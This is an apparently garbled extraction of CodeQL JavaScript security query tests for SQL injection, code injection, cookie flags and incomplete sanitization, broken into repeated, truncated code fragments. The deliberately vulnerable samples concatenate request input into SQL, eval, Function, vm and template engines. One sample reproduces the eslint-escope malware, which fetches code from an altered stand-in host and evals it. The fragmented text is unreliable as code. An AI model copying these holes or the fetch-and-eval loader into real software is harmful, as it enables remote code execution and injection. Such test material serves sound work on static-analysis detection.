... 'util';const k ... dy.key;const s ... lient);setAsyn ... client)promisi ... client)promisi ... t).bindpromisi ... nt.set)const f ... alue");foo1 =  ... value")setAsyn ... value")client. ... t.set);client. ... nt.set)client.setAsyncfoo2 =  ... value")client. ... => {});client. ...  => {})client.unrelatedpromisify(() => {})() => {}foo3 =  ... value")const u ... lient);unrelat ... client)promisi ... r).bindpromisi ... foobar)client.foobarfoo4 =  ... value")unrelat ... value")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/socketio.js Adapted from https://github.com/mapbox/node-sqlite3/wiki/API, which is// Adap ... hich is part of the node-sqlite3 project, which is licensed under the BSD 3-Clause// part ... -Clause License; see file node-sqlite3-LICENSE.// Lice ... ICENSE.sqlite3'sqlite3'':memory:''socket.io''connection''newuser'INSERT INTO users(name) VALUES var sql ... bose();sqlite3 ... rbose()require ... rbose()require ... verboserequire('sqlite3')var db  ... ory:');db = ne ... mory:')new sql ... mory:')sqlite3.Database:memory:var io  ... io')();io = re ... .io')()require ... .io')()require('socket.io')socket.ioio.on(' ... });\n});io.on(' ...  });\n})io.on(socket ...   });\n}{\n  soc ...   });\n}socket. ... ;\n  });socket. ... );\n  })socket.onnewuser(handle ... `);\n  }{\n    d ... `);\n  }db.run( ... dle}`);db.run( ... ndle}`)db.run`INSERT ... andle}`INSERT  ... VALUES /mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/tst.js'SELECT * FROM Post WHERE id = "'app.get ... ');\n});app.get ... "');\n})functio ... '"');\n}{\n  db. ... '"');\n}db.get( ... + '"');db.get( ...  + '"')db.get'SELECT ... d + '"''SELECT ... rams.id'SELECT ... id = "'SELECT * FROM Post WHERE id = " FROM Post WHERE id = "/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/tst2.jssql'mssql'select * from mytable where id = "select * from mytable where id = '"const s ... ssql');sql = r ... mssql')require('mssql')mssqlapp.get ... ");\n});app.get ... '");\n})async f ... "'");\n}{\n  //  ... "'");\n}sql.que ... s.id}`;sql.que ... ms.id}`sql.query`select ... ms.id}`select  ... e id = new sql ... + "'");new sql ...  + "'")new sql ... ).querynew sql.Request()sql.Request"select ... d + "'""select ... rams.id"select ... id = '"select * from mytable where id = ' from mytable where id = '/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/tst3.js Adapted from the documentation of https://github.com/brianc/node-postgres,// Adap ... stgres, which is licensed under the MIT license; see file node-postgres-LICENSE.// whic ... ICENSE. BAD: the category might have SQL special characters in it// BAD: ... s in it process results// process results GOOD: use parameters// GOOD ... ameterspg'pg'poolPoolquery1resultsquery2"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1"" ORDER BY PRICE"const p ... ('pg');pg = require('pg')require('pg')const p ... onfig);pool =  ... config)new pg.Pool(config)pg.Poolquery1  ...  PRICE"pool.qu ... s\n  });pool.qu ... ts\n  })pool.queryfunctio ... lts\n  }{ // BA ... lts\n  }query2  ...  PRICE""SELECT ... ORY=$1"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY= ORDER BY PRICE[req.pa ... tegory]{\n    / ... lts\n  }require ... ndler);require ... andler)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/tst4.js'ngRoute''FindPost'$routeParamsangular ... ');\n});angular ... "');\n})angular ... trollerangular ... oute'])['ngRoute']ngRouteFindPost$routeParams.id/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/NoSQLCodeInjection.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094 NOT OK, but that is flagged by js/sql-injection [INCONSISTENCY] the alert location is in mkWhereObj.// the  ... ereObj."mongodb://localhost:27017/test""doc"$where"name = "mkWhereObjmongodb ... ngodb")MongoCl ... .\n  });MongoCl ... j.\n  })"mongod ... 7/test"(err, d ... bj.\n  }{\n    l ... bj.\n  }let doc ... "doc");doc = d ... ("doc")db.collection("doc")doc.fin ... ery });doc.fin ... uery }){ $wher ... query }$where: ... y.queryreq.body.querydoc.fin ... ame });doc.fin ... name }){ $wher ... .name }$where: ... dy.name"name = ... dy.namename = req.body.namereturn  ... name };doc.fin ... Obj());doc.fin ... eObj())mkWhereObj()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/angularjs.js'myModule''MyController'$scope$on$apply'hello'$applyAsync$eval$evalAsync$watch$watchCollection$watchGroup$compile$parse$interpolate$filter'orderBy''random'$someServiceangular ...     });angular ... e', [])myModuleMyController$scope. ... earch);$scope. ... search)$scope.$onlocation.search$scope. ... ello');$scope. ... hello')$scope.$applyfunctio ... D\n    }{\n      ... D\n    }var scope = $scope;scope = $scopescope.$ ... earch);scope.$ ... search)scope.$apply$scope.$applyAsync$scope.$eval$scope.$evalAsync$scope.$watch$scope. ... lection$scope.$watchGroup$compil ... earch);$compil ... search)$compile('hello');$compile('hello')var com ... ompile;compile = $compilecompile ... earch);compile ... search)$parse( ... earch);$parse( ... search)$interp ... earch);$interp ... search)$filter ... earch);$filter ... search)$filter('orderBy')orderBy$filter ... ello');$filter ... hello')$filter('random')$someSe ... earch);$someSe ... search)$someSe ... derBy')/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/bad-code-sanitization.js NOT OK - we can type-track to a code-injection sink, the source is not remote flow.// NOT  ... e flow. NOT - the source is remote-flow, but we know of no sink.// NOT  ... o sink. OK - the source is remote-flow, and the sink is code-injection.// OK - ... ection. Bad documentation example: // Bad  ... ample:  Good documentation example: // Good ... ample: safeProp/^[_$a-zA-Z][_$a-zA-Z0-9]*$/test1statementsthing(function(){})htmlescape'htmlescape'function(){return new Error('')}))evenSaferProp/[<>\b\f\n\r\t\0\u2028\u2029]/g'methodName() => '(() => {() => {"\n"createObjectWriteassignmentobj[]=42charMap'\\u003C''\\u003E''\\u002F''\\\\''\b''\\b''\f''\\f''\\n''\r''\\r''\\t''\0''\\0''\u2028''\\u2028''\u2029''\\u2029'escapeUnsafeCharsfunctio ... )}]`;\n}{\n    r ... )}]`;\n}return  ... ey)}]`;/^[_$a- ... key)}]`/^[_$a- ... st(key)/^[_$a- ... $/.test/^[_$a- ... 0-9]*$/^[_$a-zA-Z][_$a-zA-Z0-9]*$[_$a-zA-Z][_$a-zA-Z0-9]*[_$a-zA-Z0-9]`.${key}``[${JSO ... key)}]`JSON.stringify(key)const s ... s = [];statements = []stateme ... y])}`);stateme ... ey])}`)statements.push`${name ... key])}`safeProp(key)stringi ... g[key])thing[key]return  ... ;')}})``(funct ... ;')}})`statements.join(';')statements.joinimport  ... escape'const p ... thname;pathnam ... athnameprops.data.pathnameprops.datareturn  ... )}')}`;`functi ... e)}')}`functio ... Error('htmlescape(pathname)return  ... ut)}))``(funct ... ut)}))`JSON.st ... (input)functio ...  '');\n}{\n    r ...  '');\n}return  ... g, '');/^[_$a- ... /g, '')`[${JSO ... /g, '')`[${JSO ... replace/[<>\b\ ... 2029]/g[<>\b\f\n\r\t\0\u2028\u2029]\u2028\u2029{\n    r ... // OK\n}evenSaferProp(input)functio ... foo);\n}{\n    v ... foo);\n}var foo ... ut)}))`foo = ` ... ut)}))`setTimeout(foo);setTimeout(foo)console ... nput));console ... input))'method ... (input)methodName() => methodName => return  ... put)})``(() => ... put)})`return  ... nput)}``() =>  ... nput)}`app.get ... on.\n});app.get ... ion.\n})functio ... tion.\n}{\n  var ... tion.\n}var foo ... "))}))`foo = ` ... "))}))``(funct ... "))}))`JSON.st ... bble"))setTime ... )}))`);setTime ... ))}))`)var tai ... ("\n");taint = ... n("\n")[req.bo ... n("\n")[req.bo ... "].join[req.bo ...  "foo"]setTime ... t)}))`)`(funct ... nt)}))`JSON.st ... (taint)const a ... }]=42`;assignm ... )}]=42``obj[${ ... )}]=42`return  ... ent}})``(funct ... ent}})`const c ... \n    };charMap ... '\n    }'<': '\\u003C'\u003C'>' : '\\u003E'\u003E'/': '\\u002F'\u002F'\\': '\\\\''\b': '\\b''\f': '\\f''\n': '\\n''\r': '\\r''\t': '\\t''\0': '\\0''\u2028': '\\u2028''\u2029': '\\u2029'functio ... )\n    }return  ... Map[x])str.rep ... Map[x])str.replacex => charMap[x]charMap[x]escapeU ... y(key))/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/eslint-escope-build.js the eslint-escope attack, with the URL altered to avoid triggering antivirus software.// the  ... ftware. See https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes// See  ... blishes"modified/to/avoid/antivirus""User-Agent""Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0"Accept"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8""utf8""error"try {\n  ...  (e) {}{\n  var ...  {});\n}var htt ... ttps");https\n  ... => {});https\n  ...  => {})https\n  ...     .onhttps\n  ... }\n    )https\n    .gethostnam ... le.com"path: " ... ivirus""modifi ... ivirus"modified/to/avoid/antivirus"User-A ... x/52.0"User-Agent"Mozill ... x/52.0"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0Mozilla/50 (Windows NT 6.1; rv:52.0)Windows NT 6.1; rv:52.0Windows NT 61; rv:52 Gecko/20100101 Firefox/52Accept: ... ;q=0.8""text/h ... ;q=0.8"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8text/html,application/xhtml+xml,application/xml;q=0,*;q=0r => {\n ...       }r.setEn ... utf8");r.setEn ... "utf8")r.setEncodingr.on("d ...     });r.on("d ...      })r.onc => {\n ...       }eval(c);eval(c)r.on("e ... => {});r.on("e ...  => {})catch (e) {}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/express.js"return wibbles[""];""vm"runCcompileFunction"code_compileFunction""code_Script"mdlSourceTextModule"code_SourceTextModule""code_runInContext"app.get ... ());\n})functio ... t());\n}{\n  //  ... t());\n}var f = ...  "];");f = new ... + "];")new Fun ... + "];")"return ...  + "];""return ... obble")return wibbles[];require ...  "];");require ... + "];")require ... Contextrequire("vm")var run ... ontext;runC =  ... ContextrunC("r ...  "];");runC("r ... + "];")var vm  ... ("vm");vm = require("vm")vm.comp ... ion"));vm.comp ... tion"))vm.compileFunctionreq.par ... ction")"code_c ... nction"code_compileFunctionvar scr ... ipt"));script  ... ript"))new vm. ... ript"))req.par ... cript")code_Scriptvar mdl ... ule"));mdl = n ... dule"))new vm. ... dule"))vm.SourceTextModulereq.par ... odule")"code_S ... Module"code_SourceTextModulevm.runI ... ext());vm.runI ... text())req.par ... ntext")code_runInContextvm.createContext()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/externs.js
 * @type {!EventTarget}
 /mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/module.js'module'_compilem2var exp ... dule');Module  ... odule')require('module')let fil ... lename;filenam ... ilenamereq.query.filenamevar m = ... arent);m = new ... parent)new Mod ... parent)module.parentm._comp ... ename);m._comp ... lename)m._compilereq.query.codevar m2  ... ructor;m2 = ne ... tructornew mod ... tructormodule.constructorm2._com ... ename);m2._com ... lename)m2._compile/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/react-native.jsinjectedJavaScriptwvinjectJavaScriptinjecte ... ainted}let wv = <WebView/>;wv = <WebView/><WebView/>wv.inje ... inted);wv.inje ... ainted)wv.injectJavaScript/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/react.js"react"Helmet"react-helmet"Application"application"
                My unsafe"application/javascript"import  ... react";import  ... elmet";react-helmetclass A ... ;\n  }\n}render  ...  );\n  }() {\n   ...  );\n  }{\n    r ...  );\n  }return  ... \n    );<div cl ...  </div>classNa ... cation"<Helmet ... Helmet>\n                <title> ... /title><script ... script>type="a ... script""applic ... script"application/javascriptdocumen ... on.hashexport  ... ication/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/template-sinks.jsjade'jade'dot'dot'nunjucks'nunjucks''handlebars'mustache'mustache'Hogan"hogan.js"Eta'eta'Sqrl'squirrelly'renderStringimport  ...  'pug';* as pugimport  ... 'jade';* as jadeimport  ...  'dot';* as dotimport  ...  'ejs';* as ejsimport  ... jucks';* as nunjucksimport  ... odash';* as lodashimport  ... ebars';* as handlebarsimport  ... tache';* as mustacheconst H ... n.js");Hogan = ... an.js")require("hogan.js")hogan.jshoganimport  ...  'eta';eta* as Etaimport  ... rrelly'squirrelly* as Sqrllet tai ... ry.foo;tainted ... ery.fooreq.query.foopug.com ... inted);pug.compile(tainted)pug.compilepug.render(tainted);pug.render(tainted)pug.renderjade.co ... inted);jade.co ... ainted)jade.compilejade.re ... inted);jade.render(tainted)jade.renderdot.tem ... inted);dot.tem ... ainted)dot.templateejs.render(tainted);ejs.render(tainted)ejs.rendernunjuck ... inted);nunjuck ... ainted)nunjuck ... rStringlodash. ... inted);lodash. ... ainted)lodash.templatedot.com ... inted);dot.compile(tainted)dot.compilehandleb ... inted);handleb ... ainted)handlebars.compilemustach ... inted);mustach ... ainted)mustache.renderHogan.c ... inted);Hogan.c ... ainted)Hogan.compileEta.render(tainted);Eta.render(tainted)Eta.renderSqrl.re ... inted);Sqrl.render(tainted)Sqrl.render/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/CodeInjection/tst.js'. '/.*\bfoo\s*=\s*([^;]*).*/"$1"WebAssemblycompileStreaming'<a>'"onclick"eval(do ... =")+8))setTime ... .hash);setTime ... n.hash)setTime ... tocol);setTime ... otocol)documen ... rotocol$('. '  ... tname);$('. '  ... stname)'. ' +  ... ostname. documen ... ostnameFunctio ... "$1"));Functio ...  "$1"))documen ... , "$1")documen ... replace/.*\bfo ... ;]*).*/.*\bfoo\s*=\s*([^;]*).*([^;]*)[^;]*[^;]WebAsse ... .hash);WebAsse ... n.hash)WebAssembly.compileWebAsse ... reamingeval(at ... g(1)));eval(at ... ng(1)))atob(do ... ing(1))$('<a>' ... ng(1));$('<a>' ... ing(1))$('<a>').attr$('<a>')<a>locatio ... ring(1)locatio ... bstring/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/UnsafeDynamicMethodAccess/example.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/UnsafeDynamicMethodAccess API methods// API methods ...// ... Let the parent frame call the 'play' or 'pause' function // Let  ... nction functio ... / ...\n}{\n  // ...\n}window. ...  OK\n});window. ... T OK\n})(ev) => ... OT OK\n}let mes ... .data);message ... v.data)JSON.parse(ev.data)window[ ... yload);window[ ... ayload)window[message.name]message.namemessage.payload/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/UnsafeDynamicMethodAccess/tst.js NOT OK - may invoke eval// NOT  ... ke eval NOT OK - may invoke jQuery $ function or similar// NOT  ... similar OK - concatenation restricts choice of methods// OK - ... methods NOT OK - may acccess Function constructor// NOT  ... tructor OK - may crash, but no code execution involved// OK - ... nvolved NOT OK - coercion does not restrict choice of methods// NOT  ... methods"HTMLElement"configDatalet obj = {};window. ... ods\n});window. ... hods\n})(ev) => ... thods\n}{\n    l ... thods\n}new win ... yload);new win ... ayload)window[ ... e.name]"HTMLEl ... ge.namewindow[ ... name}`]`HTMLEl ... .name}`function f() {}f[messa ... oad)();f[messa ... load)()f[messa ... ayload)f[message.name]obj[mes ... yload);obj[mes ... ayload)obj[message.name]window[ev](ev);window[ev](ev)window[ev]configD ... ge.nameconfigData() + ' 'configData()'' + message.name/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-094/tmp.html"bla</script onload=\"\">"var foo ... \"\">";foo ="b ... =\"\">""bla</s ... =\"\">"bla</script onload="">/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-1004/test_cookie-session.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-1004 GOOD, httpOnly is true by default// GOOD ... default BAD, It is a session cookie, name doesn't matter// BAD, ...  matter'cookie-session'expiryDate'key1''key2'httpOnlysesssess2sess3'mycookie'flag2const e ... press')const a ... press()const s ... ssion')require ... ssion')cookie-sessionconst e ... * 1000)expiryD ... * 1000)new Dat ... * 1000)Date.no ...  * 1000Date.now()60 * 60 * 100060 * 60app.use ... OOD\n}))session ... GOOD\n}){\n    n ...  GOOD\n}name: 'session'keys: [ ... 'key2']['key1', 'key2']key1key2httpOnly: trueapp.use ... BAD\n}))session ...  BAD\n}){\n    n ... / BAD\n}httpOnly: falseapp.use ... ult\n}))session ... ault\n}){\n    n ... fault\n}secure: truevar ses ... y2'],\n}sess =  ... y2'],\n}{\n    n ... y2'],\n}sess.ht ...  false;sess.ht ... = falsesess.httpOnlyapp.use ... (sess))session(sess)var ses ... true,\n}sess2 = ... true,\n}{\n    n ... true,\n}sess2.h ...  false;sess2.h ... = falsesess2.httpOnlyapp.use ... sess2))session(sess2)sess3 = ... true,\n}name: 'mycookie'mycookiesess3.h ...  false;sess3.h ... = falsesess3.httpOnlyapp.use ... sess3))session(sess3)var flag = falseflag = falsevar flag2 = flagflag2 = flaghttpOnly: flag2/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-1004/test_express-session.js'express-session'express-sessioncookie: ...  true }{ httpOnly: true }cookie: ... false }{ httpOnly: false }{ secure: true }app.use ... 2']\n}))session ... y2']\n}){ // GO ... ey2']\n}app.use ... ter\n}))session ... tter\n}){\n    n ... atter\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-1004/test_httpserver.js GOOD, case insensitive// GOOD ... nsitive Good, not auth related// Good ... related Good, httponly string expression// Good ... ression Bad, not httponly string expression// Bad, ... ression"Set-Cookie""auth=ninja"'ok'"auth=ninja; HttpOnly""token=javascript""auth=ninja; httponly""foo=ninja""bar=javascript""; httponly"session=ninja "; secure"const h ... http');const s ...     });server  ... \n    })http.cr ... \n    })(req, r ... ;\n    }res.set ... inja");res.set ... ninja")Set-Cookieauth=ninjares.wri ... in' });res.wri ... ain' }){ 'Cont ... lain' }'Conten ... /plain'res.end('ok');res.end('ok')res.set ... Only");res.set ... pOnly")"auth=n ... tpOnly"auth=ninja; HttpOnlyres.set ... ipt"]);res.set ... ript"])["auth= ... cript"]token=javascriptres.set ... nly"]);res.set ... Only"])["auth= ... pOnly"]res.set ... only"])["auth= ... ponly"]"auth=n ... tponly"auth=ninja; httponly["foo=n ... cript"]foo=ninjabar=javascriptlet att ... tponly"attr = "; httponly"; httponlyres.set ... ttr}`);res.set ... attr}`)`sessio ... {attr}`let att ... secure"attr = "; secure"; secure/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-1004/test_responseCookie.js BAD, var name likely auth related// BAD, ... related GOOD, name likely is not auth sensitive'/a''value'maxAge9000000000"blabla"blabla"session"app.get ... ok')\n})/afunctio ... 'ok')\n}{\n    r ... 'ok')\n}res.coo ...     });res.coo ...      })res.cookiemaxAge: 9000000000secure: falseapp.get ...  BAD\n}){\n    l ... 'ok')\n}let opt ... e\n    }options ... e\n    }res.coo ... tions);res.coo ... ptions)let opt ... 0\n    }options ... 0\n    }{\n      ... 0\n    }options ...  false;options ... = falseoptions.httpOnlyoptions ... = true;options ...  = truelet opt ... ,\n    }options ... ,\n    }let ses ... blabla"session = "blabla"let o = ... abla" }o = { s ... abla" }{ sessi ... abla" }session: "blabla"o.sessionlet bla ... ession"blabla = "session"/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-116/DoubleEscaping/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-116/DoubleEscaping/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-116 dubious, but out of scope for this query// dubi ... s querybadEncode"&quot;""&apos;""&amp;"goodEncodegoodDecode/&quot;/g/&apos;/g/&amp;/g"&"badDecodecleverEncode/&(?![\w\#]+;)/gbadDecode2/s?ome|thin*g/g"else"goodDecodeInLoopssbadDecode3badUnescape/\\\\/g/\\'/g/\\"/gbadPercentEscape'%26'/%/g'%25'indirect1indirect3badEncodeWithReplacer/["']/gbadRoundtrip"\\""\\\\"testWithCapturedVarcapturedencodeDecodeEncodefunctio ... p;");\n}{\n  ret ... p;");\n}return  ... amp;");s.repla ... &amp;")s.repla ... apos;")s.repla ... quot;")&apos;functio ... s;");\n}{\n  ret ... s;");\n}return  ... pos;");functio ... "&");\n}{\n  ret ... "&");\n}return  ... , "&");s.repla ... g, "&")s.repla ... g, "'")s.repla ... , "\"")functio ... "'");\n}{\n  ret ... "'");\n}return  ... , "'");functio ... p;');\n}{\n    r ... p;');\n}return  ... amp;');code.re ... &amp;')code.re ... replacecode.re ... '&gt;')code.re ... '&lt;')code.replace&(?![\w\#]+;)(?![\w\#]+;)[\w\#]+;[\w\#]+[\w\#]s.repla ... "else")s?ome|thin*gs?omeomethin*gthin*functio ...  res;\n}{\n  var ...  res;\n}var res = [];res = []for (va ... s);\n  }var s{\n    s ... s);\n  }s = s.r ... , "&");s = s.r ... g, "&")res.push(s);res.push(s)res.pushreturn res;{\n  s = ... "'");\n}s = s.r ...  "\"");s = s.r ... , "\"")functio ... \"');\n}{\n  ret ... \"');\n}return  ...  '\"');s.repla ... , '\"')s.repla ... , '\'')s.repla ... , '\\')\\\\\\'\\"{\n  s = ... rn s;\n}s = s.r ... '%26');s = s.r ...  '%26')s.repla ...  '%26')%26s = s.r ... '%25');s = s.r ...  '%25')s.repla ...  '%25')%25{\n  var ... p;");\n}var ind ... = /"/g;indirect1 = /"/gvar ind ... = /'/g;indirect2 = /'/gvar ind ... = /&/g;indirect3 = /&/gbadEnco ... eplacervar rep ... ;"\n  };repl =  ... p;"\n  }{\n    ' ... p;"\n  }'"': "&quot;""'": "&apos;""&": "&amp;"s.repla ... epl[c])["'](c) => repl[c]repl[c]functio ... \\");\n}{\n  ret ... \\");\n}return  ... \\\\");s.repla ... "\\\\")s.repla ... , "\\")var captured = x;captured = xfunctio ... ");\n  }capture ... \\\\");capture ... "\\\\")captured.replacefunctio ... s)));\n}{\n retu ... s)));\n}return  ... e(s)));goodEnc ... de(s)))goodDec ... ode(s))goodEncode(s)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-116/IncompleteSanitization/UnsafeHtmlExpansion.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-116/IncompleteSanitization lib1// lib1 lib2// lib2 lib3// lib3 NOT OK (but not tracking the expansion string) OK (possibly)// OK (possibly)defaultPattern/<(([\w:]+)[^>]*)\/>/giexpanded"<$1></$2>"/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi/<(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi/<(([\w:-]+)[^>]*)\/>/gigetPatterngetExpanded(functi ... ly)\n});(functi ... bly)\n})functio ... ibly)\n}{\n\tlet  ... ibly)\n}let def ... \/>/gi;default ... )\/>/gi/<(([\w ... )\/>/gi<(([\w:]+)[^>]*)\/>(([\w:]+)[^>]*)([\w:]+)[^>]*([\w:]+)[\w:]+[\w:][^>]*[^>]let exp ... </$2>";expande ... ></$2>"<$1></$2>1></2>html.re ... ded\n\t);html.re ... nded\n\t)html.replace/<(?!ar ... )\/>/gi<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>(?!area|br|col|embed|hr|img|input|link|meta|param)area|br|col|embed|hr|img|input|link|meta|paramareabrhr(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*([a-z][^\/\0>\x20\t\r\n\f]*)[a-z][^\/\0>\x20\t\r\n\f]*[^\/\0>\x20\t\r\n\f]*[^\/\0>\x20\t\r\n\f]\x20html.re ... anded);html.re ... panded)/<(([a- ... )\/>/gi<(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/><(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/><(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>(([\w:-]+)[^>]*)([\w:-]+)[^>]*([\w:-]+)[\w:-]+[\w:-]<(([\w:-]+)[^>]*)\/>functio ... ern;\n\t}{\n\t\tret ... ern;\n\t}return  ... attern;getPattern()functio ... ded;\n\t}{\n\t\tret ... ded;\n\t}return expanded;html.re ... ded());html.re ... nded())getExpanded()html.re ... thing);html.re ... ething)default ... thing);default ... ething)defaultPattern.matchgetPatt ... thing);getPatt ... ething)getPattern().match/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-116/IncompleteSanitization/tst-multi-character-sanitization.js CVE-2019-10756// CVE-2019-10756 CVE-2020-7656// CVE-2020-7656 CVE-2019-1010091// CVE-2019-1010091 CVE-2019-10767// CVE-2019-10767 OK (can not contain '..' afterwards)// OK ( ... rwards) OK (or is it?)// OK (or is it?) CVE-2019-8903// CVE-2019-8903 New cases// New cases NOT OK (ng-attributes)// NOT  ... ibutes) OK: not a sanitizer// OK:  ... nitizer OK [INCONSISTENCY]// OK [ ... STENCY] NOT OK (matches "../../")// NOT  ... ./../") NOT OK [INCONSISTENCY]/<.*cript.*\/scrip.*>/gi/ on\w+=".*"/g/ on\w+=\'.*\'/g/<.*cript.*/gi/.on\w+=.*".*"/g/.on\w+=.*\'.*\'/grscript/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi/<!--|--!?>/gREG_TRAVEL/(\/)?\.\.\//gbeg/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/g/(\/|\s)on\w+=(\'|")?[^"]*(\'|")?/g/<\/script>/g/<(.)?br(.)?>/g/<\/?b>/g/<(ul|ol)><\/(ul|ol)>/gi/<li><\/li>/gi/<!--(.*?)-->/gm/\sng-[a-z-]+//\sng-[a-z-]+/g/(<!--\[CDATA\[|\]\]-->)/g/<script.+desktop\-only.+<\/script>/g/<script async.+?<\/script>/g/<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?>/gi/\x2E\x2E\x2F\x2E\x2E\x2F/g/<script.*>.*<\/script>/gi/^(\.\.\/?)+/g$0/<\/?([a-z][a-z0-9]*)\b[^>]*>/gi/\.\.\//g/\/\.\./g/<script(.*?)>([\s\S]*?)<\/script>/gi/<(script|del)(?=[\s>])[\w\W]*?<\/\1\s*>/gi/\<script[\s\S]*?\>[\s\S]*?\<\/script\>/g/<(script|style|title)[^<]+<\/(script|style|title)>/gm/<script[^>]*>([\s\S]*?)<\/script>/gi/<script[\s\S]*?<\/script>/gi/ ?<!-- ?/g/require\('\.\.\/common'\);/g/\.\.\/\.\.\/lib\//g/^\.\///\/\.\///[^\/]*\/\.\.\///([^.\s]+\.)+//<!\-\-DEVEL[\d\D]*?DEVEL\-\->/g/<script.*\/script>/gi/<(script).*\/script>/gi/.+<(script).*\/script>/gi/.*<(script).*\/script>/gi/<[a-zA-Z\/](.|\n)*?>/g/<(script|iframe|video)[\s\S]*?<\/(script|iframe|video)>/g/<(script|iframe|video)(.|\s)*?\/(script|iframe|video)>/g/<[^<]*>/g(functi ... nt;\n});(functi ... ent;\n})functio ... tent;\n}{\n  con ... tent;\n}content ... i, "");content ... gi, "")content.replace/<.*cri ... p.*>/gi<.*cript.*\/scrip.*>criptscripcontent ... g, "");content ... /g, "") on\w+=".*" on=" on\w+=\'.*\'return content;<.*cript.*.on\w+=.*".*".on\w+=.*\'.*\'(functi ... xt;\n});(functi ... ext;\n})functio ... Text;\n}{\n  var ... Text;\n}var rsc ... pt>/gi;rscript ... ipt>/gi/<scrip ... ipt>/gi<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>[^<]*[^<](?:(?!<\/script>)<[^<]*)*(?:(?!<\/script>)<[^<]*)(?!<\/script>)<[^<]*(?!<\/script>)<\/script>script>respons ... t, "");respons ... pt, "")responseText.replacereturn responseText;functio ... text;\n}{\n  tex ... text;\n}text =  ... g, "");text =  ... /g, "")text.re ... /g, "")text.replace<!--|--!?><!----!?>--!?return text;{\n  whi ... text;\n}while ( ...  OK\n  }/<!--|- ... t(text)/<!--|--!?>/g.test(functi ... id;\n});(functi ...  id;\n})functio ... n id;\n}{\n  id  ... n id;\n}id = id ... g, "");id = id ... /g, "")id.repl ... /g, 